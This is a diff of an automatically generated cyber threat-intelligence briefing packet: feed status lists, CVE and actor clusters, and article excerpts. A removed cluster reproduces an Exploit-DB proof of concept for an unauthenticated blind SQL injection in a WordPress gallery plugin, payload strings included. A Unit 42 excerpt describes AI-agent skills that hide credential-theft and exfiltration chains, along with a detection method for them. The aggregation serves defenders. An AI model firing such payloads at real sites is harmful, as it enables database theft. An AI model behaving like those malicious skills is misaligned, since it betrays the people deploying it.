@@ -1,14 +1,14 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-06-11T23:43:15.313346+00:00
+- Generated: 2026-06-12T04:44:25.880824+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 77
-- Total items in window: 325
+- Total items in window: 322
 - Total clusters raw: 148
-- Total clusters in packet: 67
-- Dropped low score: 81
+- Total clusters in packet: 66
+- Dropped low score: 82
 - Dropped overflow: 0
 
 ## Cohort metadata
@@ -80,33 +80,13 @@
   - Status: ok
   - Item count: 15
   - In window count: 4
-- **Google Threat Analysis Group** (threat_research_primary)
-  - URL: https://blog.google/threat-analysis-group/rss/
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
 - **Microsoft Security Blog** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 4
-- **Cisco Talos** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/feedburner/Talos
-  - Status: ok
-  - Item count: 15
-  - In window count: 2
-- **Microsoft Threat Intelligence** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
-- **Trend Micro Research** (threat_research_primary)
-  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
-  - Status: ok
-  - Item count: 25
-  - In window count: 0
-- **Sekoia** (threat_research_primary)
-  - URL: https://blog.sekoia.io/feed/
+- **Google Threat Analysis Group** (threat_research_primary)
+  - URL: https://blog.google/threat-analysis-group/rss/
   - Status: parse_error
   - Item count: 0
   - In window count: 0
@@ -115,16 +95,36 @@
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **Citizen Lab** (threat_research_primary)
-  - URL: https://citizenlab.ca/feed/
+- **Trend Micro Research** (threat_research_primary)
+  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
   - Status: ok
-  - Item count: 10
+  - Item count: 25
+  - In window count: 0
+- **Cisco Talos** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/feedburner/Talos
+  - Status: ok
+  - Item count: 15
   - In window count: 2
+- **Sekoia** (threat_research_primary)
+  - URL: https://blog.sekoia.io/feed/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
 - **Kaspersky Securelist** (threat_research_primary)
   - URL: https://securelist.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Microsoft Threat Intelligence** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
+- **Citizen Lab** (threat_research_primary)
+  - URL: https://citizenlab.ca/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
 - **NCSC UK** (government_authoritative)
   - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
   - Status: ok
@@ -139,17 +139,7 @@
   - URL: https://isc.sans.edu/rssfeed_full.xml
   - Status: ok
   - Item count: 10
-  - In window count: 9
-- **Recorded Future** (threat_research_primary)
-  - URL: https://www.recordedfuture.com/feed
-  - Status: ok
-  - Item count: 50
-  - In window count: 6
-- **Volexity** (threat_research_primary)
-  - URL: https://www.volexity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
+  - In window count: 8
 - **Horizon3 Attack Research** (offensive_vulnerability_research)
   - URL: https://horizon3.ai/feed/
   - Status: ok
@@ -160,43 +150,48 @@
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **Red Canary** (detection_response_operations)
-  - URL: https://redcanary.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
 - **ESET WeLiveSecurity** (threat_research_primary)
   - URL: https://www.welivesecurity.com/en/rss/feed/
   - Status: ok
   - Item count: 100
-  - In window count: 2
-- **Exploit-DB** (offensive_vulnerability_research)
-  - URL: https://www.exploit-db.com/rss.xml
+  - In window count: 3
+- **Volexity** (threat_research_primary)
+  - URL: https://www.volexity.com/feed/
   - Status: ok
-  - Item count: 50
-  - In window count: 2
-- **Assetnote** (offensive_vulnerability_research)
-  - URL: https://www.assetnote.io/resources/research/rss.xml
-  - Status: ok
-  - Item count: 78
+  - Item count: 10
   - In window count: 0
 - **PortSwigger Research** (offensive_vulnerability_research)
   - URL: https://portswigger.net/research/rss
   - Status: ok
   - Item count: 40
   - In window count: 0
+- **Assetnote** (offensive_vulnerability_research)
+  - URL: https://www.assetnote.io/resources/research/rss.xml
+  - Status: ok
+  - Item count: 78
+  - In window count: 0
+- **Red Canary** (detection_response_operations)
+  - URL: https://redcanary.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
+- **Exploit-DB** (offensive_vulnerability_research)
+  - URL: https://www.exploit-db.com/rss.xml
+  - Status: ok
+  - Item count: 50
+  - In window count: 1
 - **watchTowr Labs** (offensive_vulnerability_research)
   - URL: https://labs.watchtowr.com/rss/
   - Status: ok
   - Item count: 15
   - In window count: 1
+- **Recorded Future** (threat_research_primary)
+  - URL: https://www.recordedfuture.com/feed
+  - Status: ok
+  - Item count: 50
+  - In window count: 5
 - **The DFIR Report** (detection_response_operations)
   - URL: https://thedfirreport.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
-- **Proofpoint Threat Insight** (detection_response_operations)
-  - URL: https://www.proofpoint.com/us/rss.xml
   - Status: ok
   - Item count: 10
   - In window count: 0
@@ -205,6 +200,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 2
+- **Proofpoint Threat Insight** (detection_response_operations)
+  - URL: https://www.proofpoint.com/us/rss.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Active Countermeasures** (detection_response_operations)
   - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
@@ -215,31 +215,41 @@
   - Status: ok
   - Item count: 15
   - In window count: 0
-- **SpecterOps** (detection_response_operations)
-  - URL: https://medium.com/feed/specter-ops-posts
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Elastic Security Labs** (detection_response_operations)
   - URL: https://www.elastic.co/security-labs/rss/feed.xml
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **Datadog Security Labs** (cloud_identity_infrastructure)
-  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
+- **SpecterOps** (detection_response_operations)
+  - URL: https://medium.com/feed/specter-ops-posts
   - Status: ok
-  - Item count: 30
-  - In window count: 1
+  - Item count: 10
+  - In window count: 0
 - **Orca Security Research** (cloud_identity_infrastructure)
   - URL: https://orca.security/resources/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
+- **Datadog Security Labs** (cloud_identity_infrastructure)
+  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
+  - Status: ok
+  - Item count: 30
+  - In window count: 1
 - **Rapid7** (offensive_vulnerability_research)
   - URL: https://www.rapid7.com/blog/rss/
   - Status: ok
   - Item count: 20
   - In window count: 7
+- **Huntress** (detection_response_operations)
+  - URL: https://www.huntress.com/blog/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 3
+- **Trail of Bits** (offensive_vulnerability_research)
+  - URL: https://blog.trailofbits.com/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 0
 - **AWS Security Blog** (cloud_identity_infrastructure)
   - URL: https://aws.amazon.com/blogs/security/feed/
   - Status: ok
@@ -250,16 +260,6 @@
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **Trail of Bits** (offensive_vulnerability_research)
-  - URL: https://blog.trailofbits.com/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 0
-- **Huntress** (detection_response_operations)
-  - URL: https://www.huntress.com/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 3
 - **Protect AI** (ai_security_agentic_risk)
   - URL: https://protectai.com/blog/rss.xml
   - Status: ok
@@ -275,11 +275,6 @@
   - Status: ok
   - Item count: 20
   - In window count: 2
-- **Cloudflare Radar** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 0
 - **Wiz Research** (cloud_identity_infrastructure)
   - URL: https://www.wiz.io/feed/rss.xml
   - Status: ok
@@ -290,21 +285,21 @@
   - Status: ok
   - Item count: 100
   - In window count: 6
-- **Coveware** (ransomware_ecrime_financial_crime)
-  - URL: https://www.coveware.com/blog?format=rss
-  - Status: parse_error
-  - Item count: 0
+- **Cloudflare Radar** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
+  - Status: ok
+  - Item count: 20
   - In window count: 0
 - **Google Cloud Security** (cloud_identity_infrastructure)
   - URL: https://cloudblog.withgoogle.com/rss/
   - Status: ok
   - Item count: 20
   - In window count: 15
-- **Chainalysis** (ransomware_ecrime_financial_crime)
-  - URL: https://www.chainalysis.com/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 4
+- **Coveware** (ransomware_ecrime_financial_crime)
+  - URL: https://www.coveware.com/blog?format=rss
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
 - **OpenSSF Blog** (ai_security_agentic_risk)
   - URL: https://openssf.org/feed/
   - Status: ok
@@ -315,6 +310,16 @@
   - Status: ok
   - Item count: 20
   - In window count: 1
+- **Google Cloud Threat Intelligence** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
+  - Status: ok
+  - Item count: 20
+  - In window count: 2
+- **Chainalysis** (ransomware_ecrime_financial_crime)
+  - URL: https://www.chainalysis.com/blog/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 4
 - **The Record** (cyber_news_breach_reporting)
   - URL: https://therecord.media/feed
   - Status: ok
@@ -325,18 +330,23 @@
   - Status: ok
   - Item count: 15
   - In window count: 15
-- **Google Cloud Threat Intelligence** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
-  - Status: ok
-  - Item count: 20
-  - In window count: 2
 - **Simon Willison** (ai_security_agentic_risk)
   - URL: https://simonwillison.net/atom/everything/
   - Status: ok
   - Item count: 30
-  - In window count: 19
+  - In window count: 18
+- **GreyNoise** (cloud_identity_infrastructure)
+  - URL: https://www.greynoise.io/blog/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 0
 - **SecurityWeek** (cyber_news_breach_reporting)
   - URL: https://www.securityweek.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
+- **CyberScoop** (cyber_news_breach_reporting)
+  - URL: https://cyberscoop.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
@@ -345,13 +355,8 @@
   - Status: ok
   - Item count: 20
   - In window count: 1
-- **GreyNoise** (cloud_identity_infrastructure)
-  - URL: https://www.greynoise.io/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 0
-- **CyberScoop** (cyber_news_breach_reporting)
-  - URL: https://cyberscoop.com/feed/
+- **Help Net Security** (cyber_news_breach_reporting)
+  - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
@@ -360,11 +365,6 @@
   - Status: ok
   - Item count: 50
   - In window count: 22
-- **Help Net Security** (cyber_news_breach_reporting)
-  - URL: https://www.helpnetsecurity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
 - **Black Hills Information Security** (detection_response_operations)
   - URL: https://www.blackhillsinfosec.com/feed/
   - Status: ok
@@ -380,11 +380,6 @@
   - Status: ok
   - Item count: 15
   - In window count: 1
-- **Krebs on Security** (practitioner_analysis)
-  - URL: https://krebsonsecurity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
 - **Team Cymru** (ransomware_ecrime_financial_crime)
   - URL: https://www.team-cymru.com/post/rss.xml
   - Status: ok
@@ -395,8 +390,23 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 50
 - **Reddit r/blueteamsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/blueteamsec/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **Krebs on Security** (practitioner_analysis)
+  - URL: https://krebsonsecurity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
+- **Reddit r/sysadmin** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/sysadmin/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
@@ -405,31 +415,21 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Reddit r/sysadmin** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/sysadmin/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
 - **Reddit r/netsecstudents** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsecstudents/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Reddit r/AskNetsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/AskNetsec/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
-  - Status: ok
-  - Item count: 50
-  - In window count: 50
 - **Graham Cluley** (practitioner_analysis)
   - URL: https://grahamcluley.com/feed/
   - Status: ok
   - Item count: 20
   - In window count: 3
+- **Reddit r/AskNetsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/AskNetsec/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
 - **Intel 471** (ransomware_ecrime_financial_crime)
   - URL: https://intel471.com/blog/feed
   - Status: ok
@@ -497,13 +497,13 @@
   - https://www.securityweek.com/greatxml-zero-day-exploit-bypasses-bitlocker/
   - https://thehackernews.com/2026/06/new-greatxml-exploit-bypasses-windows.html
 
-### CVE-2026-50752 exploitation activity
-- Anchor signal: CVE-2026-50752
-- Theme key: cve-2026-50752
+### CVE-2026-50751 exploitation activity
+- Anchor signal: CVE-2026-50751
+- Theme key: cve-2026-50751
 - Cluster count: 2
 - Article count: 3
 - Cohesion: 0.479
-- Shared strong signals: CVE-2026-50752
+- Shared strong signals: CVE-2026-50751
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
@@ -516,13 +516,13 @@
   - https://thehackernews.com/2026/06/critical-check-point-vpn-flaw-exploited.html
   - https://www.infosecurity-magazine.com/news/check-point-critical-auth-bypass/
 
-### CVE-2026-50751 exploitation activity
-- Anchor signal: CVE-2026-50751
-- Theme key: cve-2026-50751
+### CVE-2026-50752 exploitation activity
+- Anchor signal: CVE-2026-50752
+- Theme key: cve-2026-50752
 - Cluster count: 2
 - Article count: 3
 - Cohesion: 0.479
-- Shared strong signals: CVE-2026-50751
+- Shared strong signals: CVE-2026-50752
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
@@ -668,6 +668,30 @@
   - https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/
   - https://thehackernews.com/2026/06/veeam-backup-replication-rce-flaw-lets.html
 
+### ShinyHunters: ransomware extortion
+- Anchor signal: ShinyHunters
+- Theme key: shinyhunters
+- Cluster count: 2
+- Article count: 10
+- Cohesion: 0.238
+- Shared strong signals: ShinyHunters
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: ransomware_extortion, zero_day, data_breach
+  - actor_attribution: ShinyHunters
+  - affected_industries: education
+  - urgency_signals: zero_day
+- Cluster IDs: 0fea8614d6, 52dabc044f
+- Links:
+  - https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-targets-education-sector-oracle-exploit/
+  - https://www.bleepingcomputer.com/news/security/oracle-mitigates-peoplesoft-zero-day-exploited-in-data-theft-attacks/
+  - https://www.helpnetsecurity.com/2026/06/11/oracle-peoplesoft-under-attack-cve-2026-35273/
+  - https://thehackernews.com/2026/06/shinyhunters-exploits-oracle-peoplesoft.html
+  - https://www.securityweek.com/oracle-addresses-peoplesoft-vulnerability-amid-reports-of-zero-day-attacks/
+  - https://research.checkpoint.com/2026/8th-june-threat-intelligence-report/
+  - https://www.bleepingcomputer.com/news/security/nottingham-university-data-breach-affects-over-450-000-students/
+
 ### CVE-2026-5027 exploitation activity
 - Anchor signal: CVE-2026-5027
 - Theme key: cve-2026-5027
@@ -707,27 +731,12 @@
   - https://cyberscoop.com/cisco-sdwan-zero-day-vulnerability-exploited-cve202620245/
   - https://www.infosecurity-magazine.com/news/check-point-critical-auth-bypass/
 
-### Microsoft Windows vulnerability activity
-- Anchor signal: Microsoft Windows
-- Theme key: microsoft-windows
-- Cluster count: 2
-- Article count: 2
-- Cohesion: 0.2
-- Shared strong signals: Microsoft Windows
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - affected_products: Microsoft Windows
-- Cluster IDs: 6007b3dd3f, 655ad7f913
-- Links:
-  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-05-06-2026
-  - https://blog.talosintelligence.com/microsoft-patch-tuesday-for-june-2026-snort-rules-and-prominent-vulnerabilities/
-
 ## Forward signals
 
 ### Novelty
 - Novel cves: 0
-- Novel actors: 0
+- Novel actors: 1
+  - APT32 (first seen via ESET WeLiveSecurity at 2026-06-11T08:45:00+00:00, cluster 749883f0dd)
 - Novel products: 0
 
 ### Velocity bursts (1)
@@ -881,7 +890,7 @@ CVE-2026-0257 Palo Alto Networks PAN-OS GlobalProtect Authentication Bypass Vuln
   - Link: https://www.securityweek.com/splunk-palo-alto-networks-patch-severe-vulnerabilities/
   - Summary: The security defects could allow attackers to create or modify arbitrary files and access and modify protected resources. The post Splunk, Palo Alto Networks Patch Severe Vulnerabilities appeared first on SecurityWeek .
 
-### Cluster 0fea8614d6 — score 49
+### Cluster 0fea8614d6 — score 48
 
 - Title: ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit
 - Source: Google Cloud Threat Intelligence (threat_research_primary)
@@ -1543,55 +1552,6 @@ The First AI State-Sponsored Attack: What It Means for Defenders Horizon3.ai Jun
   - Link: https://simonwillison.net/2026/Jun/11/asyncinject/#atom-everything
   - Summary: Release: asyncinject 0.7 I built this utility library to support an asyncio dependency injection pattern a few years ago. I was using it with Datasette and Claude Fable 5 spotted some bugs in the dependency which it then fixed for me. It's a very proactive model! Tags: async , projects , python , claude-mythos
 
-### Cluster ce8fdc8c42 — score 20
-
-- Title: [webapps] WordPress Contest Gallery 28.1.4 - Unauthenticated Blind SQL Injection
-- Source: Exploit-DB (offensive_vulnerability_research)
-- Published: 2026-06-05T00:00:00+00:00
-- Link: https://www.exploit-db.com/exploits/52609
-- Fetch status: ok
-- Member count: 2
-- Corroborating source count: 2
-- Strong signals: WordPress
-
-#### Cluster taxonomy (union across members)
-- affected_products: WordPress
-- cve_ids: CVE-2026-3300
-- urgency_signals: poc_available, preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research, tier_4_news
-
-#### Primary article taxonomy
-- affected_products: WordPress
-- urgency_signals: preauth_unauth, poc_available
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Summary
-
-```
-WordPress Contest Gallery 28.1.4 - Unauthenticated Blind SQL Injection
-```
-
-#### Full body
-
-```
-Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training WordPress Contest Gallery 28.1.4 - Unauthenticated Blind SQL Injection EDB-ID: 52609 CVE: 2026-3180 EDB Verified: Author: cardosource Type: webapps Exploit: / Platform: Multiple Date: 2026-06-05 Vulnerable App: # Exploit Title: WordPress Contest Gallery 28.1.4 - Unauthenticated Blind SQL Injection # Google Dork: N/A # Date: 2026-06-02 # Exploit Author: cardosource # Vendor Homepage: https://contest-gallery.com/ # Software Link: https://wordpress.org/plugins/contest-gallery/ # Version: <= 28.1.4 # Tested on: Docker - PHP 8.2/Apache + MariaDB (WordPress Environment) # CVE: 2026-3180 """ Description A Blind SQL Injection vulnerability exists in Contest Gallery versions 28.1.4 and earlier. The issue is caused by the unsafe use of the cgl_maili parameter, where sanitize_email() preserves the single quote (') character in the local part of an email address. As a result, user-controlled input reaches wpdb->get_row() without proper parameterization via prepare(), allowing unauthenticated attackers to perform boolean-based blind SQL injection. Authentication Required: No """ import requests import json NONCE = " " URL = "http://localhost:8080/wp-admin/admin-ajax.php" endpoint = "/wp-admin/admin-ajax.php" url = "http://localhost:8080/" payload = "'OR/**/1=1#@teste.com' and 'OR/**/1=2#@teste.com" def send_payload(mail): data = { "action": "post_cg1l_resend_unconfirmed_mail_frontend", "cgl_mail": mail, "cgl_page_id": "1", "cgl_activation_key": "", "cg_nonce": NONCE, } return requests.post(URL, data=data) r_true = send_payload("qualquer'OR/**/1=1#@teste.com") if r_true.status_code == 200: status_code = r_true.status_code banner = f""" CVE : 2026-3180 | Contest Gallery 28.1.4 : Boolean SQLi payload :........................{payload} end point :........................{endpoint} url :..............................{url} status :...........................{status_code} nonce :............................{NONCE} """ print(banner) print(f"Body length: {len(r_true.text)} chars") poc =f'''\nmariadb wordpress_db -e " SELECT * FROM wp_contest_gal1ery_create_user_entries ORDER BY Tstamp DESC LIMIT 1115;"''' print(poc) Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services
-```
-
-#### Corroborating sources (2)
-
-- **Exploit-DB** (offensive_vulnerability_research)
-  - Title: [webapps] WordPress Contest Gallery 28.1.4 - Unauthenticated Blind SQL Injection
-  - Published: 2026-06-05T00:00:00+00:00
-  - Link: https://www.exploit-db.com/exploits/52609
-  - Summary: WordPress Contest Gallery 28.1.4 - Unauthenticated Blind SQL Injection
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Hackers Exploit Critical Everest Forms Pro WordPress Plugin Flaw to Take Over Sites
-  - Published: 2026-06-05T08:38:59+00:00
-  - Link: https://thehackernews.com/2026/06/hackers-exploit-critical-everest-forms.html
-  - Summary: Threat actors are actively exploiting a critical security flaw in Everest Forms Pro, a WordPress plugin with about 4,000 active installations, to execute arbitrary code, leading to a complete site compromise. The vulnerability in question is CVE-2026-3300 (CVSS score: 9.8), a remote code execution bug impacting all versions of the plugin up to, and including, 1.9.12. A patch for the flaw was
-
 ### Cluster cc7cd597eb — score 20
 
 - Title: Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms
@@ -1652,7 +1612,48 @@ Threat Intelligence Seeking Counsel: Ongoing Targeted Campaign Against US Law Fi
   - Link: https://thehackernews.com/2026/06/unc3753-used-vishing-and-physical.html
   - Summary: Cybersecurity researchers have disclosed details of a financially motivated data theft extortion campaign that has targeted dozens of organizations across professional, legal, and financial services in the U.S. between January and May 2026. The activity has been attributed by Google Mandiant and Google Threat Intelligence Group (GTIG) to a threat actor dubbed UNC3753, which is also known as
 
-### Cluster 3e3984a344 — score 19
+### Cluster 82878a14f9 — score 18
+
+- Title: Trust No Skill: Integrity Verification for AI Agent Supply Chains
+- Source: Unit 42 (threat_research_primary)
+- Published: 2026-06-11T10:00:24+00:00
+- Link: https://unit42.paloaltonetworks.com/ai-agent-supply-chain-risks/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: credential_theft, supply_chain
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: supply_chain, credential_theft
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Protect enterprise AI agents from supply chain risks by auditing third-party skills for hidden vulnerabilities and multi-stage attack chains. The post Trust No Skill: Integrity Verification for AI Agent Supply Chains appeared first on Unit 42 .
+```
+
+#### Full body
+
+```
+Threat Research Center Threat Research Malware Malware Trust No Skill: Integrity Verification for AI Agent Supply Chains 7 min read Related Products Code to Cloud Platform Prisma AIRS Unit 42 AI Security Assessment By: Yuhao Wu Tony Li Hongliang Liu Published: June 11, 2026 Categories: Malware Threat Research Tags: AI agents Credential exfiltration LLMs OpenClaw Supply chain Share Executive Summary AI agents now extend their capabilities by installing third-party skills the way smartphones install apps. Anyone can publish a skill to a public registry. Anyone can install one into a production agent. And until now, no automated tool has verified what a skill does before it gains privileged access to credentials, files and shell commands inside that agent. We introduce Behavioral Integrity Verification (BIV), an audit primitive that compares what a skill claims to do against what it does, across all three of its surfaces: Metadata Executable code Natural-language instructions Applied at registry scale, BIV finds that most skills deviate from declared behavior. The vast majority of those gaps are sloppy documentation, not malice. But a smaller, dangerous slice carries multi-stage attack chains, where individually benign-looking capabilities combine into credential theft, remote code execution or silent data exfiltration. The agent-skill ecosystem now stands where mobile applications and browser extensions were a decade ago. Extensibility has outpaced the supply-chain audit primitives that should gate it. Security teams running large language model (LLM) agents in production should inventory the third-party skills installed and require a behavioral-integrity check before installation rather than after. Palo Alto Networks customers are better protected from this type of issue through the following products and services: Prisma AIRS The Unit 42 AI Security Assessment can help empower safe AI use and development. If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics LLM , AI Agents , Supply Chain Background Enterprises now deploy LLM agents to automate tasks across code generation, IT operations, customer support and internal workflows. These agents are extended with skills, the agent equivalent of an app: a small package that bundles executable code with a YAML manifest and a natural-language SKILL.md file telling the agent when and how to use it. Once installed, a skill runs inside the agent's privileged context. It can read environment variables, call external services, write files and execute shell commands on behalf of the organization. Public agent-skill registries now host tens of thousands of these packages. Anyone can publish. Anyone can install. The platforms that came before, package managers, mobile app stores and browser extension marketplaces, all eventually grew automated audit ecosystems after attackers turned the openness against users. The agent-skill ecosystem has not. The audit problem in this ecosystem differs from anything earlier platforms faced. A skill's behavior splits across three modalities: Metadata Executable code Natural-language instructions The metadata declares what the skill is supposed to do. The code and instructions together drive what it does. No existing scanner reads all three, and the registry has no automated way to verify that the two sides match. BIV is the audit primitive that compares them. The Method: Declared Vs. Actual Behavior BIV asks one question of every skill: Does what it says match what it does? To answer that question consistently across tens of thousands of skills, BIV needed a shared vocabulary. We used a fixed taxonomy of 29 capabilities organized into seven families: Network File system Process execution Environment Encoding Credentials Instruction-level threats Two parallel tracks populate the taxonomy: The declared track reads the metadata. Deterministic parsers handle structural fields l
+```
+
+#### Corroborating sources (1)
+
+- **Unit 42** (threat_research_primary)
+  - Title: Trust No Skill: Integrity Verification for AI Agent Supply Chains
+  - Published: 2026-06-11T10:00:24+00:00
+  - Link: https://unit42.paloaltonetworks.com/ai-agent-supply-chain-risks/
+  - Summary: Protect enterprise AI agents from supply chain risks by auditing third-party skills for hidden vulnerabilities and multi-stage attack chains. The post Trust No Skill: Integrity Verification for AI Agent Supply Chains appeared first on Unit 42 .
+
+### Cluster 3e3984a344 — score 18
 
 - Title: From SQLi to RCE – Exploiting LangGraph’s Checkpointer
 - Source: Check Point Research (threat_research_primary)
@@ -1698,47 +1699,6 @@ CATEGORIES AI Research 16 Android Malware 23 Artificial Intelligence 5 ChatGPT 3
   - Published: 2026-06-11T13:37:11+00:00
   - Link: https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/
   - Summary: By Yarden Porat AI agents need memory. Frameworks like LangGraph provide it through checkpointers – persistence layers that store execution state. But what happens when that persistence layer isn’t locked down? Key Points Background LangGraph is an open-source framework for building stateful, multi-agent AI systems with built-in persistence. It’s an extension of LangChain, with over […] The post From SQLi to RCE – Exploiting LangGraph’s Checkpointer appeared first on Check Point Research .
-
-### Cluster 82878a14f9 — score 18
-
-- Title: Trust No Skill: Integrity Verification for AI Agent Supply Chains
-- Source: Unit 42 (threat_research_primary)
-- Published: 2026-06-11T10:00:24+00:00
-- Link: https://unit42.paloaltonetworks.com/ai-agent-supply-chain-risks/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: credential_theft, supply_chain
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: supply_chain, credential_theft
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Protect enterprise AI agents from supply chain risks by auditing third-party skills for hidden vulnerabilities and multi-stage attack chains. The post Trust No Skill: Integrity Verification for AI Agent Supply Chains appeared first on Unit 42 .
-```
-
-#### Full body
-
-```
-Threat Research Center Threat Research Malware Malware Trust No Skill: Integrity Verification for AI Agent Supply Chains 7 min read Related Products Code to Cloud Platform Prisma AIRS Unit 42 AI Security Assessment By: Yuhao Wu Tony Li Hongliang Liu Published: June 11, 2026 Categories: Malware Threat Research Tags: AI agents Credential exfiltration LLMs OpenClaw Supply chain Share Executive Summary AI agents now extend their capabilities by installing third-party skills the way smartphones install apps. Anyone can publish a skill to a public registry. Anyone can install one into a production agent. And until now, no automated tool has verified what a skill does before it gains privileged access to credentials, files and shell commands inside that agent. We introduce Behavioral Integrity Verification (BIV), an audit primitive that compares what a skill claims to do against what it does, across all three of its surfaces: Metadata Executable code Natural-language instructions Applied at registry scale, BIV finds that most skills deviate from declared behavior. The vast majority of those gaps are sloppy documentation, not malice. But a smaller, dangerous slice carries multi-stage attack chains, where individually benign-looking capabilities combine into credential theft, remote code execution or silent data exfiltration. The agent-skill ecosystem now stands where mobile applications and browser extensions were a decade ago. Extensibility has outpaced the supply-chain audit primitives that should gate it. Security teams running large language model 